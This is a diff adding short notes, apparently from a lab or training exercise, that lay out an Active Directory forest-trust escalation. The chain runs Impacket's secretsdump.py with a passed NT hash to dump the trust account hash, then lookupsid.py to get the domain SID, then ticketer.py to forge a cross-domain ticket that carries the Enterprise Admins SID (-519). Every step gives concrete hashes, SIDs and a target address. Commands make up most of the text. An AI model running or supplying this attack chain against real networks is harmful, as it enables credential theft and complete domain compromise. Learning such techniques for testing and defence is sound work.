@@ -1,0 +1,15 @@
+first find out the trust account hash via secertsdup:
+
+
+-------secretsdump.py -hashes :52838ab3f033c0676080b52043d2cb0f Administrator@172.25.170.80
+
+note: In Active Directory, a trailing     "$"    indicates a Service Account or Machine Account. A specific type of account created to manage the trust relationship with the other domain in FOrest.
+
+find the SID:
+-----------python3 /usr/share/doc/python3-impacket/examples/lookupsid.py ECC.LOCALNET/Administrator@172.25.170.80 -hashes :52838ab3f033c0676080b52043d2cb0f
+
+Forge the cross domain ticket now: 
+
+-python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash 7bc0301380a0989237882a4cf6a16d4c -domain-sid S-1-5-21-129659399-3041378498-1097317347 -domain ECC.LOCALNET -extra-sid S-1-5-21-129659399-3041378498-1097317347-519 Administrator
+ (here -519 is Relative identifier (RID) for Enterprise Admin - By adding the Extra SID ending in -519, you are essentially "faking" a credential that says: "I am not just a local admin; I am an Enterprise Admin for the whole forest."))
+
